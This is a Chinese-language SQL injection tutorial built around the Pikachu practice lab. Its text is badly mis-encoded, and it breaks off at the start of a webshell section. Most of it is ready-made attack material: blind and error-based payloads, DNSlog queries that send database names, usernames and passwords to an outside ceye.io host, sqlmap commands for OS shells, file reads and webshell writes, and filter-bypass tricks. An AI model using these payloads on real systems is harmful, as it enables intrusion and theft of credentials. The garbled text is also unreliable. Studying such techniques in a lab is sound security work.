4ï¼Œä¸­è½¬æ³¨å…¥æŠŠå‚æ•°ä¸­è½¬ä¸€ä¸‹ï¼Œå†å‘é€åˆ°æŒ‡å®šç½‘å€ä¸Šå»ï¼Œå¯ä»¥å¯¹è¯·æ±‚æºå¸¦çš„æ•°æ®è¿›è¡ŒäºŒæ¬¡åŠ å·¥ã€‚ æ¯”å¦‚ï¼Œæˆ‘ç”¨ä¸‹é¢è¿™ä¸ªwebugè™šæ‹Ÿæœºæ¼”ç¤ºä¸€ä¸‹ä¸­è½¬æ³¨å…¥ï¼Œç‰©ç†æœºå°†è¯·æ±‚å‘ç»™å®ƒï¼Œå®ƒå°†è¯·æ±‚æ•°æ®å¤„ç†ä¸€ä¸‹ï¼Œç„¶åè½¬å‘ç»™pikachuç«™ç‚¹è¿›è¡Œæ³¨å…¥ã€‚ ?php $a = $_GET[name]; //jaden $a_64 = base64_encode($a); $url=http://192.168.2.109/pikachu/vul/sqli/sqli_str.php?name=.$a_64.submit=%E6%9F%A5%E8%AF%A2; echo $url; $ret = file_get_contents($url); echo $ret;? åé¢å­¦ä¹ äº†sqlmapä¹‹åï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°†sqlmapçš„è¯·æ±‚éƒ½å‘é€åˆ°è¿™ä¸ªè„šæœ¬ä¸Šï¼Œé‚£ä¹ˆå‡¡æ˜¯é€šè¿‡è¿™ä¸ªè„šæœ¬çš„payloadï¼Œéƒ½ä¼šè¢«base64ç¼–ç ä¸€ä¸‹ï¼Œç„¶åå†å‘é€ç»™ç›®æ ‡ã€‚ 5ï¼Œä¼ªé™æ€æ³¨å…¥é¦–å…ˆè¦æ˜ç™½æ¦‚å¿µï¼Œä¼ªé™æ€ï¼Œå…¶å®å°±æ˜¯çœ‹ä¼¼ä¸ºé™æ€é¡µé¢ï¼Œå®åˆ™ä¸ºåŠ¨æ€é¡µé¢ï¼Œå°±ç§°ä¹‹ä¸ºä¼ªé™æ€é¡µé¢ï¼Œè€Œä¼ªé™æ€é¡µé¢çš„æ³¨å…¥å°±å«åšä¼ªé™æ€æ³¨å…¥ã€‚ å…¶å®å…³äºé™æ€ã€åŠ¨æ€ã€ä¼ªé™æ€ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹urlå¤§è‡´å°±èƒ½å‘ç°ã€‚ ## åŠ¨æ€ï¼š http://192.168.0.26/pikachu/vul/sqli/sqli_str.php?name=vincesubmit=%E6%9F%A5%E8%AF%A2 https://search.jd.com/search?keyword=%E6%89%8B%E6%9C%BAwq=%E6%89%8B%E6%9C%BAev=5_122671%5E## é™æ€ï¼š http://127.0.0.1:8000/jaden/index.html http://127.0.0.1:8000/jaden/person.html## ä¼ªé™æ€ï¼š http://127.0.0.1:8000/jaden/1/wei_news.html http://127.0.0.1:8000/jaden/news/1.html ## åŠ¨æ€è®¿é—®ï¼šhttp://192.168.61.149/forum.php?mod=viewthreadtid=1extra=page%3D1 ## é™æ€è®¿é—®ï¼šhttp://192.168.61.149/thread-1-1-1.html ## é…ç½®è§„åˆ™ï¼šrewrite ^([^\\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=viewthreadtid=$2extra=page%3D$4page=$3 last; 9ï¼Œç›²æ³¨ä¸å›æ˜¾åœ¨æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥è¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ä½†å´ä»€ä¹ˆéƒ½æ²¡æœ‰è¿”å›çš„æƒ…å†µæˆ‘ä»¬è¯¥æ€ä¹ˆåŠï¼Ÿä¾‹å¦‚åº”ç”¨ç¨‹åºå°±ä¼šè¿”å›ä¸€ä¸ªâ€œé€šç”¨çš„â€çš„é¡µé¢ï¼Œæˆ–è€…é‡å®šå‘ä¸€ä¸ªé€šç”¨é¡µé¢ï¼ˆå¯èƒ½ä¸ºç½‘ç«™é¦–é¡µï¼‰ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„SQLæ³¨å…¥åŠæ³•å°±æ— æ³•ä½¿ç”¨äº†ã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬ç§°ä¹‹ä¸ºæ— å›æ˜¾ï¼Œå¦‚æœé¡µé¢æœ‰ä¿¡æ¯æ˜¾ç¤ºï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæœ‰å›æ˜¾ã€‚å›æ˜¾çŠ¶æ€çš„é¡µé¢æ²¡ä»€ä¹ˆå¯è¯´çš„ï¼Œæ— å›æ˜¾çš„è¿™ç§æˆ‘ä»¬å°±å¯ä»¥é‡‡ç”¨ç›²æ³¨çš„æ‰‹æ®µ 1ï¼ŒBoolian(å¸ƒå°”å‹)ç›²æ³¨ç›²æ³¨ï¼Œå³åœ¨SQLæ³¨å…¥è¿‡ç¨‹ä¸­ï¼ŒSQLè¯­å¥æ‰§è¡Œé€‰æ‹©åï¼Œé€‰æ‹©çš„æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç›²æ³¨ã€‚ å‘ç°è¿™ä¸ªæ³¨å…¥æ²¡æœ‰æ•ˆæœäº† é‡‡ç”¨sqlè¯­å¥ä¸­andçš„æ–¹æ³•ï¼Œè¿”å›æ­£ç¡®æˆ–é”™è¯¯æ¥æ„é€ ï¼ŒæŒ‰ç…§ä¹‹å‰çš„æ€è·¯æ„é€ ä¸€ä¸ªSQLæ‹¼æ¥: vinceâ€™ and extractvalue(0,concat(0x7e,version()))# è¾“å…¥åæ ¹æ®è¿”å›çš„ä¿¡æ¯åˆ¤æ–­ä¹‹å‰çš„æ€è·¯ä¸å†é€‚ç”¨ã€‚ ç›²æ³¨è¯­å¥ ## åˆ¤æ–­ç”¨çš„æ•°æ®åº“çš„é•¿åº¦vince and length(database())=7# ## è‹¥é•¿åº¦ä¸º7åˆ™è¿”å›æ•°æ®ï¼Œå¦‚æœä¸æ˜¯åˆ™ä¸ä¼šè¿”å›æ•°æ®ï¼Œè¿™æ ·åå¤å°è¯•å¯ä»¥ç›´åˆ°åº“åçš„é•¿åº¦ ## è·å–æ•°æ®åº“åvince and ascii(substr(database(),1,1)) = 112# ## åˆ¤æ–­æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯çš„asciiå€¼æ˜¯å¦ä¸º112ï¼Œä¹Ÿå°±æ˜¯p,é€šè¿‡ä¸æ–­å°è¯•ï¼Œå¯ä»¥æ‹¿åˆ°åº“å ç»“æœæ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨è¿™ä¸ªæ³¨å…¥ç‚¹ï¼Œå¸ƒå°”å‹ç›²æ³¨åŸºæœ¬éƒ½æ˜¯é€šè¿‡asciiç æ¥æµ‹è¯•çš„ã€‚ select id,username,email from member where username=vince and ascii(substr(database(),1,1))=112# 2ï¼Œæ—¶é—´å‹ç›²æ³¨åˆ°base on timeç›²æ³¨ä¸‹ï¼Œè¾“å…¥ä¸Šä¸ªæ¼”ç¤ºä¸­è®¾ç½®å¥½çš„payload vinceâ€™ and ascii(substr(database(),1,1))112# ï¼Œè¿”å›çš„ä¿¡æ¯å‘ç°ä¸å­˜åœ¨æ³¨å…¥ç‚¹ã€‚é‚£è¿™æ ·å°±ä¸èƒ½è¿›è¡Œæ³¨å…¥äº†ï¼Ÿå½“ç„¶è¿˜è¦ç»§ç»­å°è¯•ï¼Œå…¶å®å¯ä»¥é€šè¿‡åç«¯çš„æ‰§è¡Œæ—¶é—´æ¥è¿›è¡Œæ³¨å…¥ã€‚è¿™é‡Œä¼šç”¨åˆ°çš„ payload: vinceâ€™ and sleep(x)# , sleep(5)é‚£ä¹ˆä½ ä¼šçœ‹åˆ°é¡µé¢ç­‰å¾…äº†5ç§’é’Ÿæ‰å‡ºç»“æœï¼Œè¯´æ˜æœ‰æ³¨å…¥ç‚¹ ç›²æ³¨è¯­å¥ vince and if(length(database())=7,sleep(5),null)# åˆ¤æ–­æ•°æ®åº“åé•¿åº¦ï¼Œæ¡ä»¶ä¸ºçœŸåˆ™è¿›è¡Œç¡çœ ï¼Œå¦åœ¨ä¸ä¼šæœ‰æ•°æ®vince and if(substr(database(),1,1)=p,sleep(5),null)#vince and if(ascii(substr(database(),1,1))=112,sleep(5),null)# ## æ—¶é—´å‹ç›²æ³¨ç»å¸¸ä½¿ç”¨çš„å‡½æ•°ï¼š sleep(5) benchmark(10000000,MD5(1)) ## benchmarkæ˜¯mysqlçš„å†…ç½®å‡½æ•°ï¼Œæ˜¯å°†MD5(1)æ‰§è¡Œ10000000æ¬¡ä»¥è¾¾åˆ°å»¶è¿Ÿçš„æ•ˆæœ å¦‚æœsleepè¢«é˜²å¾¡äº†ï¼Œå¯ä»¥ä½¿ç”¨benchmarkã€‚ 10,dnslogdnslogæ³¨å…¥ä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºdnså¸¦å¤–æŸ¥è¯¢ï¼ŒDnsåœ¨åŸŸåè§£ææ—¶ä¼šåœ¨DNSæœåŠ¡å™¨ä¸Šç•™ä¸‹åŸŸåå’Œè§£æipçš„è®°å½•ï¼Œå¯ä»¥åœ¨dnsæœåŠ¡å™¨ä¸ŠæŸ¥è¯¢ç›¸åº”çš„dnsè§£æè®°å½•ï¼Œæ¥è·å–æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚ å¤§è‡´åŸç†ï¼š å…·å¤‡DNSlogæ—¥å¿—è®°å½•åŠŸèƒ½çš„ç½‘ç«™Aæˆ‘ä»¬ä¸ç”¨è‡ªå·±æ­å»ºï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹ä¸‰ä¸ªï¼Œå½“ç„¶å¦‚æœä½ æƒ³è‡ªå·±æ­å»ºä¹Ÿæ˜¯å¯ä»¥çš„ï¼š http://ceye.io/ çŸ¥é“åˆ›å®‡å…¬å¸æä¾›çš„http://www.dnslog.cn/http://admin.dnslog.link #æœ€è¿‘å‘ç°ï¼Œè¿™ä¸ªå¥½åƒä¸å¤ªå¥½ç”¨äº† æ¡ä»¶ï¼š 1ã€éœ€è¦mysqlç”¨æˆ·å…·å¤‡è¯»æ–‡ä»¶çš„æƒé™ï¼Œå› ä¸ºè¦å€ŸåŠ©åˆ°mysqlçš„load_fileè¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼Œæƒé™ä¸å¤Ÿçš„è¯ï¼Œä¸èƒ½è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚å…¶å®åªè¦mysqlä¸­é…ç½®é¡¹ä¸­å¼€å¯äº†è¿™ä¸ªsecure_file_privé…ç½®ï¼Œå°±å¯ä»¥é€šè¿‡sqlè¯­å¥æ¥æ‰§è¡Œæ–‡ä»¶è¯»å†™æ“ä½œã€‚ 2ã€ç›®æ ‡mysqlæ•°æ®åº“æœåŠ¡å™¨èƒ½å¤Ÿè®¿é—®å¤–ç½‘,å…¶å®load_file()ä¸ä»…èƒ½å¤ŸåŠ è½½æœ¬åœ°æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¯¹è¯¸å¦‚ [www.jaden.com](http://www.jaden.com) è¿™æ ·çš„URLå‘èµ·è¯·æ±‚ã€‚è¿™æ ·çš„urlæˆ‘ä»¬ç§°ä¹‹ä¸ºUNCè·¯å¾„ï¼Œç®€å•äº†è§£å³å¯ã€‚å°±å€ŸåŠ©load_fileå‡½æ•°èƒ½å¤Ÿè®¿é—®æŸä¸ªç½‘å€çš„ç‰¹æ€§ï¼Œæ¥è¿›è¡ŒDNSlogæ³¨å…¥ï¼Œæ³¨å…¥è¯­å¥å¦‚ä¸‹ select load_file(\\\\\\\\xxx.xxxx.xxx\\\\xx);#xxx.xxxx.xxx\\\\xxæ˜¯æŸä¸ªç½‘å€ æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼Œè¿™ä¸ªç®€å•çœ‹ä¸€ä¸‹å³å¯ ç¬¬ä¸€æ­¥ï¼šå…ˆçœ‹ä¸€ä¸‹ç½‘å€åŸŸå 9fqiop.ceye.io ç¬¬äºŒæ­¥ï¼šå°†ç½‘å€æ·»åŠ åˆ°sqlè¯­å¥ä¸­ select load_file(\\\\\\\\9fqiop.ceye.io\\\\abc); ç¬¬ä¸‰æ­¥ï¼šå¼€å¯MySQLçš„è¯»å–æ–‡ä»¶åŠŸèƒ½çš„é…ç½®é¡¹ ç¬¬å››æ­¥ï¼šåœ¨mysqlå‘½ä»¤è¡Œå…ˆæ‰§è¡Œä¸€ä¸‹æˆ‘ä»¬çš„å†™å¥½çš„sqlè¯­å¥ ç¬¬äº”æ­¥ï¼šçœ‹ä¸€ä¸‹æ—¥å¿—è®°å½• å‘ç°ï¼Œæœ‰è®°å½•äº†ï¼Œå¹¶ä¸”çœ‹åˆ°äº†ppè¿™ä¸ªæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­æ„é€ è·å–æ•æ„Ÿæ•°æ®çš„sqlè¯­å¥äº† select load_file(concat(//,(select database()),.9fqiop.ceye.io/abc)) #è·å–åº“å ç¬¬å…­æ­¥ï¼šå¼€å§‹æ³¨å…¥ ä¸‹é¢ä¸¤ä¸ªéƒ½å¯ä»¥ï¼š 1ï¼Œè·å–åº“åselect * from member where id=1 and (select load_file(concat(//,(select database()),.9fqiop.ceye.io/abc)))select * from member where id=1 and (select load_file(concat(\\\\\\\\,(select database()),.9fqiop.ceye.io\\\\abc))) pikachuç½‘ç«™æµ‹è¯•ï¼šæŠ“åŒ…ï¼Œæ·»åŠ æ³¨å…¥è¯­å¥ æŸ¥çœ‹DNSè®°å½• æˆåŠŸé€šè¿‡dnsè®°å½•ï¼Œå¸¦å‡ºäº†å½“å‰æ•°æ®åº“çš„åç§°pikachu 2ï¼Œè·å–è¡¨åand (select load_file(concat(\\\\\\\\,(select table_name from information_schema.tables where table_schema=database() limit 0,1),.e06o0h.ceye.io\\\\abc)))and (select load_file(concat(\\\\\\\\,(select table_name from information_schema.tables where table_schema=database() limit 1,1),.e06o0h.ceye.io\\\\abc)))and (select load_file(concat(\\\\\\\\,(select table_name from information_schema.tables where table_schema=database() limit 2,1),.e06o0h.ceye.io\\\\abc)))## ä¿®æ”¹limitåé¢çš„æ•°å­—å³å¯å°†æ¯ä¸ªè¡¨åéƒ½æŸ¥å‡ºæ¥ 3ï¼ŒæŸ¥è¯¢å­—æ®µåand (select load_file(concat(\\\\\\\\,(select column_name from information_schema.columns where table_schema=database() and table_name=member limit 0,1),.9fqiop.ceye.io\\\\abc)))## åŒæ ·ä¹Ÿæ˜¯ä¿®æ”¹limitåé¢çš„æ•°å­—ï¼Œå°†memberè¡¨çš„å­—æ®µåä¸€ä¸ªä¸€ä¸ªçš„å–å‡ºæ¥ 4ï¼Œè·å–æ•°æ®æŸ¥è¯¢ä¸€ä¸‹memberçš„usernameå’Œpwå­—æ®µçš„æ•°æ® and (select load_file(concat(\\\\\\\\,(select username from member limit 0,1),.9fqiop.ceye.io\\\\abc)))and (select load_file(concat(\\\\\\\\,(select pw from member limit 0,1),.9fqiop.ceye.io\\\\abc))) payloadæ€»ç»“k and updatexml(1,concat(~,(SELECT @@version),~,~,(SELECT user())),1) #k and extractvalue(11,concat(~,(SELECT @@version),~,~,(SELECT user())))#k and extractvalue(11,concat(~,(SELECT @@version),~,~,(SELECT database())))#kand updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 1)),0)#kand updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema=pikachu)),0)#k and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=users and table_schema=pikachu limit2,1)),0)#k and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#jadenor updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 0,1)),0) or or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=userslimit 2,1)),0) or or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or ç­‰åŒäº or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or 1=1 3,mysqlå˜é‡å’Œå‡½æ•°mysql show global variables;# select @@version_compile_os; 4ï¼Œsqlmap 1,æ³¨å…¥è·å–æ•°æ®çš„ç›¸å…³å‚æ•°--dbsï¼š ## ä¼šè·å–æ‰€æœ‰çš„æ•°æ®åº“ //é»˜è®¤æƒ…å†µä¸‹sqlmapä¼šè‡ªåŠ¨çš„æ¢æµ‹webåº”ç”¨åç«¯çš„æ•°æ®åº“ç±»å‹ï¼šMySQLã€Oracleã€PostgreSQLã€MicrosoftSQL Serverã€Microsoft Accessã€SQLiteã€Firebirdã€Sybaseã€SAPMaxDBã€DB2--current-userï¼š ## å¤§å¤šæ•°æ•°æ®åº“ä¸­å¯æ£€æµ‹åˆ°æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·--current-dbï¼š## å½“å‰è¿æ¥æ•°æ®åº“å--is-dbaï¼š## åˆ¤æ–­å½“å‰çš„ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†--usersï¼š## åˆ—å‡ºæ•°æ®åº“æ‰€æœ‰æ‰€æœ‰ç”¨æˆ· -tables è·å–è¡¨å æŒ‡ä»¤ï¼š --tables -D æ•°æ®åº“å## -Dæ˜¯æŒ‡å®šæŸä¸ªæ•°æ®åº“ï¼Œå¦‚æœä¸åŠ -Då‚æ•°ï¼Œé‚£ä¹ˆä¼šå°†æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨è·å–å‡ºæ¥ï¼Œæœ€å¥½æŒ‡å®šæ•°æ®åº“åï¼Œè¿™æ ·ç²¾å‡†å¿«é€Ÿä¸€äº›ã€‚ â€“columnsè·å–å­—æ®µå æŒ‡ä»¤ï¼š -T user -C username,password,email --dump è¯»æ–‡ä»¶å†…å®¹ æŒ‡ä»¤ï¼š --file-read /etc/password ç³»ç»Ÿäº¤äº’çš„shel æŒ‡ä»¤ï¼š --os-shell å†™webshell æŒ‡ä»¤ï¼š --file-write c:/2.txtâ€ --file-dest â€œC:/php/htdocs/sql.phpâ€ -v 1--file-write c:/2.txtâ€ --file-dest â€œC:\\phpStudy\\PHPTutorial\\WWW\\xx.phpâ€ -v 1 æŸ¥è¯¢httpsç½‘ç«™â€“force-ssl sqlmap -u https://192.168.18.26:82/sqlserver/1.aspx?xxser=1 --force-ssl -proxyä½¿ç”¨ä»£ç†è¿æ¥ sqlmap -u http://192.168.18.26:82/sqlserver/1.aspx?xxser=1 -proxy http://192.168.18.100:82## å¿«ä»£ç†ï¼šsqlmap -u http://192.168.18.26:82/sqlserver/1.aspx?xxser=1 -proxy http://183.21.81.188:41825 â€“proxy-fileä½¿ç”¨æ–‡ä»¶ä¸­çš„ä»£ç†åœ°å€è¿æ¥ vim 1.txt## æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š http://192.168.18.100:82 http://192.168.18.101:82 http://192.168.18.102:82 http://192.168.18.103:82 ## æŒ‡ä»¤ï¼š sqlmap -u http://192.168.18.26:82/sqlserver/1.aspx?xxser=1 -proxy-file 1.txt ## ä»£ç†ipæˆ‘ä»¬å¯ä»¥å»ä¸€äº›å…è´¹çš„ç½‘ç«™æ‰¾ï¼Œæ¯”å¦‚ï¼šè¥¿ç¥ ä»£ç†å’Œå¿«ä»£ç† 5,åç«¯ä»£ç é˜²å¾¡ç»•è¿‡?php$uname = $_GET(username);## æƒ…å†µä¸€ï¼šåˆ¤æ–­å…³é”®å­— if (select in $uname) echo ä¸è¦æäº‹æƒ… ## æƒ…å†µäºŒï¼šæ›¿æ¢å…³é”®å­— å°†select * from usersä¸­çš„selectæ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸² echo str_replace(select,,select * from users);## æƒ…å†µä¸‰ï¼šç›´æ¥å°†ç”¨æˆ·æäº¤çš„idæ•°æ®è½¬æ¢ä¸ºæ•´å‹ $id = $_POST(id); $id_int = intval($id); select * from users where id=$id_int## æƒ…å†µå››ï¼šé­”æœ¯ç¬¦å·ï¼Œå°†ç”¨æˆ·æäº¤çš„æ•°æ®ä¸­çš„å¼•å·è‡ªåŠ¨åœ¨å‰é¢åŠ ä¸Š\\è¿›è¡Œè½¬ä¹‰ ## magic_quotes_gpc=on ## æˆ–è€…ä½¿ç”¨äº†addslashes($id)...? æˆ‘ä»¬æ‹¿è¿™ä¹ˆå‡ ç§é˜²å¾¡æ‰‹æ³•æ¥ä¸¾ä¾‹ æƒ…å†µä¸€ç»•è¿‡ï¼šå¤§å°å†™ç»•è¿‡ï¼šSELECT * FROM USERSï¼› æƒ…å†µäºŒç»•è¿‡ï¼šåŒå†™ï¼šselselectect * from users; å…¶å®str_replaceåªæ›¿æ¢äº†ä¸€æ¬¡selectè¿˜å‰©ä¸‹ä¸€ä¸ªselect æƒ…å†µä¸‰ï¼šå¼ºé˜²å¾¡ï¼Œè¿™ç§çš„å¾ˆéš¾ç»•è¿‡äº†ï¼Œå› ä¸ºæˆ‘ä»¬å†™çš„æ³¨å…¥è¯­å¥éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œé’ˆå¯¹æäº¤æ•°æ®ä¸ºçº¯æ•°å­—çš„æ—¶å€™ï¼Œè¿™ç§é˜²å¾¡å°±å¾ˆéš¾ç»•è¿‡äº†ï¼Œä½†æ˜¯å¥½å¤šæ—¶å€™ï¼Œç”¨æˆ·æ­£å¸¸å‘åå°æäº¤çš„æ•°æ®éƒ½æ˜¯éæ•°å­—ç±»å‹çš„ï¼Œè¿™æ ·çš„è¯å°±ä¸ä¼šè¿›è¡Œintval()çš„åŠ å·¥ï¼Œå°±å¯ä»¥å°è¯•å…¶ä»–æ³¨å…¥æ‰‹æ³•ã€‚ æƒ…å†µå››ï¼šå¼€å¯äº†é­”æœ¯ç¬¦å·è½¬ä¹‰åŠŸèƒ½ï¼Œè¿™ç§çš„å‚çœ‹æˆ‘ä»¬å‰é¢è¯´çš„å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ç­‰ï¼Œå…¶ä»–åŠæ³•å¾ˆéš¾ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªç‚¹ï¼Œå°±æ˜¯å¦‚æœå¯¹id1è¿™ç§æ•°å­—å‹çš„æ³¨å…¥ï¼Œè¿˜æ˜¯æœ‰å…¶ä»–åŠæ³•çš„ï¼Œæ¯”å¦‚id1 and select * from users;è¿™æ ·çš„æ³¨å…¥è¯­å¥æ²¡æœ‰å•å¼•å·ã€‚ è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„é˜²å¾¡æ‰‹æ³•ï¼Œå°±éœ€è¦ç§¯ç´¯ç»éªŒäº†ï¼Œåé¢å­¦ä¹ åˆ°waf(webåº”ç”¨é˜²ç«å¢™)çš„æ—¶å€™ï¼Œä¼šå­¦ä¹ å¾ˆå¤šwafç»•è¿‡çš„æ‰‹æ³•ï¼Œå…¶ä¸­å¥½å¤šå’Œåå°ä»£ç ç»•è¿‡çš„æ‰‹æ³•ä¸€æ ·ï¼Œæ‰€ä»¥åå°ä»£ç ç»•è¿‡å°±å…ˆè¯´è¿™ä¹ˆå¤šï¼Œç­‰å­¦åˆ°wafç»•è¿‡çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†å¤šå­¦ä¹ ã€‚ 6ï¼ŒSQLæ³¨å…¥è¯»å–æ–‡ä»¶å’Œæ•°æ®åº“æ•°æ®1ï¼Œè¯»å–æ–‡ä»¶æ•°æ®å‰ææ¡ä»¶ ## 1ã€é€šè¿‡ä¿¡æ¯æ”¶é›†è·å–åˆ°æƒ³è¦è¯»å–çš„ç›®æ ‡æ–‡ä»¶çš„çœŸå®ç‰©ç†è·¯å¾„## 2ã€mysqlå¼€å¯äº†secure_file_privè¿™ä¸ªé…ç½® ç„¶åé‡å¯mysqlå³å¯ã€‚ è¯»å–æ–‡ä»¶çš„çš„SQLè¯­å¥ å€ŸåŠ©mysqlè‡ªå¸¦çš„åŠŸèƒ½å‡½æ•°load_file æµ‹è¯•unionè”åˆæŸ¥è¯¢è¯­å¥ ä½¿ç”¨unionéœ€è¦æ³¨æ„åé¢æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µä¸ªæ•°ï¼Œè¦å’Œå‰é¢çš„ä¸ªæ•°ç›¸åŒ æµ‹è¯•æ³¨å…¥ æ•ˆæœ 2ï¼Œæ³¨å…¥è¯­å¥vince union select 1,load_file(C:\\\\tools\\\\phpstudy\\\\PHPTutorial\\\\1.txt)# 2ï¼Œè¯»å–æ•°æ®åº“æ•°æ®1ï¼Œåˆ¤æ–­æŸ¥è¯¢çš„å­—æ®µä¸ªæ•° order by 1,2,3--+ #æŠ¥é”™ï¼Œè¡¨ç¤ºå­—æ®µä¸ªæ•°å°äº3ä¸ªï¼Œé‚£ä¹ˆå‡å°‘ä¸€ä¸ªå­—æ®µæ¥å°è¯• order by 1,2--+ #ä¸æŠ¥é”™ï¼Œè¡¨ç¤ºå­—æ®µä¸ªæ•°ä¸º2ä¸ªï¼Œå¦‚æœè¿˜æŠ¥é”™ï¼Œé‚£ä¹ˆç»§ç»­å‡å°‘ä¸€ä¸ªæ¥å°è¯• order by 1,2# order by 1,2,3# æ•ˆæœ è¡¨ç¤ºï¼Œè¿™ä¸ªå­—ç¬¦å‹æ³¨å…¥çš„æŸ¥è¯¢ï¼Œåå°selectè¯­å¥åé¢æŸ¥è¯¢çš„æ˜¯2ä¸ªå­—æ®µæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±çŸ¥é“ï¼Œé€šè¿‡unionè”åˆæŸ¥è¯¢çš„æ—¶å€™ï¼ŒæŸ¥è¯¢çš„æ•°æ®æ˜¯2ä¸ªå­—æ®µæ•°æ®äº†ã€‚ 2ï¼ŒæŸ¥è¯¢å½“å‰æ•°æ®åº“åã€ç”¨æˆ·åã€ç‰ˆæœ¬ç­‰ä¿¡æ¯ union select user(),version()--+ 3ï¼Œè·å–mysqæ‰€æœ‰åº“å union select 1,group_concat(schema_name) from information_schema.schemata+--+ ## æµè§ˆå™¨åœ°å€æ è¦URLç¼–ç ï¼Œè¡¨å•ç›´æ¥#æˆ–è€… -- å°±å¯ä»¥union select 1,group_concat(schema_name) from information_schema.schemata## -- mysqlçš„æ³¨é‡Šç¬¦å· 4ï¼Œè·å–pikachuåº“çš„æ‰€æœ‰è¡¨å union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+ union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()# 5ï¼Œè·å–è¡¨ä¸­çš„å­—æ®µå union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273+--+ union select 1,group_concat(column_name) from information_schema.columns where table_name=member+--+ 6, è·å–æ‰€æœ‰å­—æ®µæ•°æ® union select 1,group_concat(id,0x7c,username,0x7c,password,0x7c,level,0x7c) from users+--+ ## å…¶ä¸­0x7cè¡¨ç¤º|ï¼Œæˆ‘è¿™é‡Œå°±æ˜¯ä¸ºäº†é€šè¿‡|æ¥æ‹¼æ¥æ¯ä¸ªæ•°æ®ã€‚group_concatç±»ä¼¼äºconcatï¼Œä¹Ÿæ˜¯åšå­—ç¬¦ä¸²æ‹¼æ¥çš„ï¼Œæ˜¯MySQLçš„ä¸€ä¸ªå†…ç½®å‡½æ•° 3,getshell1ï¼Œæœ¨é©¬åˆ©ç”¨è¯•éªŒå°±ç”¨æˆ‘ä»¬ä¹‹å‰çš„ç¯å¢ƒå§ï¼Œå°±æ˜¯éƒ¨ç½²äº†pikachuç«™ç‚¹çš„é‚£ä¸ªè™šæ‹Ÿæœºã€‚ å€è®¿é—®ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œæ²¡æœ‰æŠ¥é”™ï¼Œè¡¨ç¤ºæ–‡ä»¶å¯ä»¥é€šè¿‡ç½‘å€æ­£å¸¸è®¿é—®åˆ°ã€‚ 2ï¼Œä¸€å¥è¯æœ¨é©¬åˆ©ç”¨ç¨‹åº## èœåˆ€ã€èšå‰‘ã€å†°èã€å“¥æ–¯æ‹‰å››å¤§æœ¨é©¬åˆ©ç”¨ç¥å™¨ï¼Œç°åœ¨æ¨èå†°èå’Œèšå‰‘ï¼ŒåŠŸèƒ½æ›´å¥½ä¸€äº›ï¼Œå…³äºè¿™äº›å·¥å…·çš„ä»‹ç»å’Œä½¿ç”¨æˆ‘åœ¨æœ¨é©¬è¯¾ç¨‹ä¸­æœ‰ä¸“é—¨çš„è®²è§£ï¼ŒåŒ…å«ä»–ä»¬è‡ªå·±çš„ç‰¹å¾ä¿¡æ¯ã€æµé‡æ•°æ®ç‰¹å¾åˆ†æã€å·¥å…·åŸç†å’Œé…ç½®ç­‰ï¼Œåœ¨è¿™é‡Œå°±ä¸å¤šæäº†ã€‚ä¸‹é¢ä½¿ç”¨çš„èšå‰‘å°±åœ¨æˆ‘ç»™å¤§å®¶win10è™šæ‹Ÿæœºä¸Šæ”¾çš„vstartå·¥å…·æ–‡ä»¶å¤¹ä¸­ï¼š 3ï¼Œé€šè¿‡æ³¨å…¥ç‚¹å†™å…¥æœ¨é©¬ç¨‹åºçš„å‰ææ¡ä»¶1. mysqlå¼€å¯äº†secure_file_priv=çš„é…ç½®2. è¦çŸ¥é“ç½‘ç«™ä»£ç çš„çœŸå®ç‰©ç†è·¯å¾„3. ç‰©ç†è·¯å¾„å…·å¤‡å†™å…¥æƒé™4. 